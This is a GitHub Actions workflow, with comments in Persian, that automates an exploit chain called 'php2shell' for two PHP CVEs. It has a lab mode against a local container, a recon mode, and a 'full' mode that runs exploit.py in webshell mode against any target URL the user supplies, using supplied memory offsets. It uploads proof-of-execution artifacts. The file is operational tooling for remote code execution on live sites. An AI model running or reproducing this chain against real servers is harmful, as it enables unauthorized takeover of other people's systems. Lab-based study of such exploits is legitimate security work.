name: php2shell — CVE-2026-109618/109619 chain

on:
  workflow_dispatch:
    inputs:
      mode:
        description: "lab = اثبات زنجیره روی lab | recon = تشخیص بی‌خطر | full = زنجیره روی سایت"
        required: true
        default: "lab"
        type: choice
        options: [lab, recon, full]
      target:
        description: "آدرس هدف برای recon/full"
        required: false
        default: ""
      target_offsets_env:
        description: "offsets.env بیلد هدف — دو خط: ZIF_OFFSET=0x.. و DTOR_OFFSET=0x.."
        required: false
        default: ""
      retries:
        description: "تعداد retry زنجیره"
        required: false
        default: "3"
      dbg:
        description: "tmate در صورت شکست"
        required: false
        default: false
        type: boolean

concurrency:
  group: php2shell-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read            # ← برای actions/checkout لازم است

jobs:
  chain:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    env:
      TARGET: ${{ inputs.target }}
      OFF: ${{ inputs.target_offsets_env }}
      RETRIES: ${{ inputs.retries }}
    steps:
      - uses: actions/checkout@v4

      - name: Guard — target
        if: inputs.mode != 'lab'
        run: |
          set -euo pipefail
          [ -n "$TARGET" ] || { echo "::error::target خالی است"; exit 1; }

      - name: Guard — full needs offsets
        if: inputs.mode == 'full'
        run: |
          set -euo pipefail
          [ -n "$OFF" ] || { echo "::error::offsets بیلد هدف لازم است"; exit 1; }

      # ---------- LAB ----------
      - name: Lab — start target
        if: inputs.mode == 'lab'
        run: |
          set -euo pipefail
          mkdir -p out
          chmod +x lab.sh
          ./lab.sh
          sudo chmod -R 777 out      # ← /out توسط www-data chown شده

      - name: Lab — extract offsets
        if: inputs.mode == 'lab'
        run: |
          set -euo pipefail
          python3 -c "from lib.offsets import extract_from_container, save_offsets_env; z,d=extract_from_container('php2shell-target'); save_offsets_env('out/offsets.env',z,d); print(f'zif=0x{z:x} dtor=0x{d:x}')"

      - name: Lab — recon
        if: inputs.mode == 'lab'
        run: |
          set -euo pipefail
          python3 exploit.py -t http://127.0.0.1:18110/index.php \
            --recon-only --output json | tee out/recon.json

      - name: Lab — run chain
        if: inputs.mode == 'lab'
        run: |
          set -euo pipefail
          python3 exploit.py -t http://127.0.0.1:18110/index.php \
            --cmd "(id; uname -a)" \
            --offsets-env out/offsets.env \
            --restart php2shell-target \
            --retries "$RETRIES" \
            --out-dir out

      - name: Lab — verify proof
        if: inputs.mode == 'lab'
        run: |
          set -euo pipefail
          grep -q "uid=" out/.p2s_result
          echo "PROOF: $(cat out/.p2s_result)"

      # ---------- RECON ----------
      - name: Recon
        if: inputs.mode == 'recon'
        run: |
          set -euo pipefail
          python3 exploit.py -t "$TARGET" --recon-only --output json | tee recon.json

      # ---------- FULL ----------
      - name: Full — write + validate offsets
        if: inputs.mode == 'full'
        run: |
          set -euo pipefail
          mkdir -p out
          printf '%s\n' "$OFF" > target-offsets.env
          grep -q '^ZIF_OFFSET=0x'  target-offsets.env
          grep -q '^DTOR_OFFSET=0x' target-offsets.env
          cat target-offsets.env

      - name: Full — chain (in-band webshell, no /out needed)
        if: inputs.mode == 'full'
        run: |
          set -euo pipefail
          python3 exploit.py -t "$TARGET" \
            --cmd "id" \
            --mode webshell \
            --offsets-env target-offsets.env \
            --retries "$RETRIES"

      # ---------- مشترک ----------
      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: php2shell-${{ inputs.mode }}-${{ github.run_id }}
          path: |
            out/
            recon.json
            target-offsets.env
          include-hidden-files: true     # ← .p2s_result و .p2s_proof
          if-no-files-found: warn
          retention-days: 1

      - name: Debug SSH on failure
        if: failure() && inputs.dbg
        uses: mxschmitt/action-tmate@v3
